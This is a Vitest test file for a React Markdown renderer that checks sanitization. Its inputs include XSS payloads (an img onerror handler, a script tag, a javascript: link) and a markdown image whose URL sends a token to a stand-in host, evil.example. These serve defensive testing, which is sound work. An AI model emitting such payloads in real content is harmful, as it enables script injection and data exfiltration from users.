import { renderToStaticMarkup } from 'react-dom/server'
import { expect, test } from 'vitest'
import { Markdown } from './Markdown'

const render = (text: string) => renderToStaticMarkup(<Markdown text={text} />)

test('raw HTML is dropped', () => {
  const html = render('hi <img src="https://evil.example/x.png" onerror="alert(1)"> <script>alert(1)</script>')
  expect(html).not.toContain('<img')
  expect(html).not.toContain('<script')
  expect(html).not.toContain('onerror')
})

test('a markdown image is not loaded', () => {
  const html = render('![secret](https://evil.example/?q=token)')
  expect(html).not.toContain('<img')
  expect(html).toContain('[image: secret]')
})

test('links open in a new tab without access to the page', () => {
  const html = render('[docs](https://example.com)')
  expect(html).toContain('target="_blank"')
  expect(html).toContain('rel="noopener noreferrer"')
})

test('javascript links lose their target', () => {
  expect(render('[x](javascript:alert(1))')).not.toContain('javascript:')
})
